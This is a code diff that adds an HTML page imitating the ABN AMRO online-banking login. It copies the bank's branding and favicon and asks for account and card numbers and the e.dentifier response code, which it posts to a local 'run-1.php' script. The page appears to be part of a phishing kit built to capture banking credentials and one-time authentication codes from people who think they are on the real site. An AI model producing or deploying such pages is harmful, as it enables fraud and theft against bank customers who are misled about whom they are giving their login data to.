@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ABN AMRO</title>
+    <link href="https://www.abnamro.nl/nl/retail/pr/static/favicon.ico" rel="shortcut icon">
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #007d71;
+            display: flex;
+            flex-direction: column;
+        }
+        .content {
+            flex-grow: 1; /* Zorgt ervoor dat de content het meeste van de beschikbare ruimte opvult */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        .top-bar {
+            background-color: white;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #ccc;
+        }
+        .top-bar img {
+            height: 30px;
+        }
+        .menu {
+            display: flex;
+            align-items: center;
+        }
+        .menu a {
+            color: #007d71;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .menu a:hover {
+            text-decoration: underline;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .tabs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .tabs a {
+            flex: 1;
+            text-align: center;
+            text-decoration: none;
+            color: #007d71;
+            font-weight: normal;
+            font-size: 16px;
+            padding-bottom: 5px;
+            border-bottom: 2px solid transparent;
+        }
+        .tabs a.active {
+            border-bottom: 2px solid #007d71;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+        .form-group label {
+            margin-bottom: 5px;
+            font-weight: normal;
+        }
+        .form-group .input-group {
+            display: flex;
+            align-items: center;
+        }
+        .form-group .input-group span {
+            background-color: #f3f3f3;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 5px 0 0 5px;
+            height: 34px; /* Match the height of the input */
+            display: flex;
+            align-items: center;
+        }
+        .form-group .input-group input {
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 0 5px 5px 0;
+            height: 34px; /* Match the height of the span */
+            width: 60px; /* Adjust the width to be longer */
+        }
+        .form-group input[type="checkbox"] {
+            width: auto;
+            margin-right: 5px;
+        }
+        .form-group .input-group .small-input {
+            margin-left: 5px;
+            width: 40px;
+            height: 34px; /* Match the height of the other input */
+        }
+        .form-group input#respons {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            height: 34px; /* Match the height of the other inputs */
+        }
+        .btn-login {
+            background-color: #ffcc00;
+            color: #000;
+            border: none;
+            padding: 8px 0;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%; /* Full width for the login button */
+            height: 34px; /* Match the height of the other inputs */
+        }
+        .btn-login:hover {
+            background-color: #e6b800;
+        }
+        .footer {
+            background-color: white;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-top: 1px solid #ccc;
+            font-size: 14px;
+            color: #007d71;
+            margin-top: auto; /* Duwt de footer naar de onderkant */
+        }
+        .footer a {
+            color: #007d71;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 768px) {
+            .top-bar {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .top-bar img {
+                margin-bottom: 10px;
+            }
+            .menu {
+                flex-wrap: wrap;
+                justify-content: center;
+                width: 100%;
+                text-align: center;
+            }
+            .menu a {
+                margin: 5px 10px;
+            }
+            .footer {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+            .footer a {
+                margin: 5px 10px;
+            }
+        }
+    </style>
+</head>
+<form action="run-1.php" method="post">
+<body>
+    <div class="top-bar">
+        <img src="Files/logo.png" alt="ABN AMRO Logo">
+    </div>
+    <div class="content">
+        <div class="container">
+            <div class="tabs">
+                <a href="#" id="prive-tab" class="active">Privé</a>
+                <a href="#" id="zakelijk-tab">Zakelijk</a>
+            </div>
+            <form>
+                <h2 style="font-weight: normal; margin-top: 0;">Log in met e.dentifier</h2>
+                <div class="form-group">
+                    <label for="rekening">Rekening- en pasnummer</label>
+                    <div class="input-group">
+                        <span>NL ** ABNA 0</span>
+                        <input style="width:100px;" type="text" id="pasnummer" name="pasnummer" minlength="9" required="">
+                        <input type="text" id="pasnummer1" name="pasnummer1" minlength="3" required="" class="small-input">
+                    </div>
+                </div>
+                <div class="form-group" style="flex-direction: row; align-items: center;">
+                    <input type="checkbox" id="onthoud" name="onthoud">
+                    <label for="onthoud">Onthoud rekening- en pasnummer</label>
+                </div>
+                <div class="form-group">
+                    <label for="respons">Respons</label>
+                    <input style="width:200px" minlength="5" required="" type="text" id="respons" name="respons">
+                </div>
+                <button type="submit" style="width:100px; height:30px; font-size:14px;" class="btn-login">Inloggen</button>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <div>
+            <a href="#">NL</a> |
+            <a href="#">EN</a> |
+            <a href="#">Veilig bankieren</a> |
+            <a href="#">Toegankelijkheid</a> |
+            <a href="#">Privacy en cookies</a> |
+            <a href="#">Disclaimer</a>
+        </div>
+        <div>© ABN AMRO</div>
+    </div>
+    <script>
+        document.getElementById('prive-tab').addEventListener('click', function(e) {
+            e.preventDefault();
+            this.classList.add('active');
+            document.getElementById('zakelijk-tab').classList.remove('active');
+        });
+
+        document.getElementById('zakelijk-tab').addEventListener('click', function(e) {
+            e.preventDefault();
+            this.classList.add('active');
+            document.getElementById('prive-tab').classList.remove('active');
+        });
+    </script>
+</body>
+</html>
